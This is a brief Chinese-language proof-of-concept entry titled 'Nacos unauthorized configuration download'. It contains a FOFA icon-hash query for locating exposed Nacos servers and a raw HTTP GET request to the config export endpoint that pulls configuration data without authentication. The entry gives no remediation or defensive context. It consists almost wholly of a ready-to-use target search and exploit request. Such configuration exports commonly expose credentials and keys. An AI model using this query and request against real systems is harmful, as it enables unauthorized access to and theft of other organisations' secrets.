# Nacos未授权下载配置信息

Nacos未授权下载配置信息

## fofa

```javascript
icon_hash="13942501"
```

## poc

```java
GET /v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId= HTTP/1.1
Host: 
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409191401675.png)